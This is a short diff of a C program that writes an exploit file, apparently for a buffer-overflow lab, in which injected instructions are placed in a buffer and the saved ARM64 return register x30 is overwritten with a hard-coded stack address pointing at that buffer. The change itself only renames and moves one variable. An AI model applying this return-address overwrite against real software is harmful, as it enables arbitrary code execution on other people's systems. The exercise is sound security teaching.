@@ -5,6 +5,7 @@ int main(void) {
     FILE *f = fopen("dataA","wb");
     unsigned long pc = 0;
     unsigned int instr;
+    unsigned long buffAddr;
     int i;
 
     /* 1) Emit your 99-instr stub *into the buffer* */
@@ -25,8 +26,8 @@ int main(void) {
 
     /* 3) Overwrite saved x30 with the *address of the buffer* */
     /*    Suppose the grader’s buf[] lives at 0x7fffffffe220 in its stack */
-    unsigned long bufAddr = 0x7fffffffe220UL;
-    fwrite(&bufAddr, sizeof bufAddr, 1, f);
+    buffAddr = 0x7fffffffe220UL;
+    fwrite(&buffAddr, sizeof buffAddr, 1, f);
 
     fclose(f);
     return 0;
